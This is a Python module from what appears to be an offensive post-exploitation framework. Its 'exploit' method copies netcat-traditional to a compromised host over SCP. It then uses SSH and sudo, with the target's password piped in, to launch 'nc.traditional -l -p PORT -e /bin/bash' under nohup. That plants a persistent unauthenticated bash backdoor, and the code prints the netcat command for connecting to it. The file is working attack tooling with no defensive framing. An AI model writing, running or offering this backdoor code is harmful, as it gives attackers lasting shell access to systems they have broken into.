from module import *
import os
import cmd
from colorama import *
from definitions import *

class Netcat_Traditional(Module):
    prompt = Fore.RED + "(nct) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using netcat traditional module"
        self.target = target
        self.core = core
        self.options = {
                "port"   : Option("port", 53926, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")
        print(INFO + "Shipping netcat-traditional package.")
        self.target.scpFiles(self, '/bin/nc.traditional', False)
        print(GOOD + "Initializing backdoor on port %s..." % port)
        self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % port)
        print(GOOD + "Backdoor attempted. Use nc " + self.target.hostname + " %s." % port)
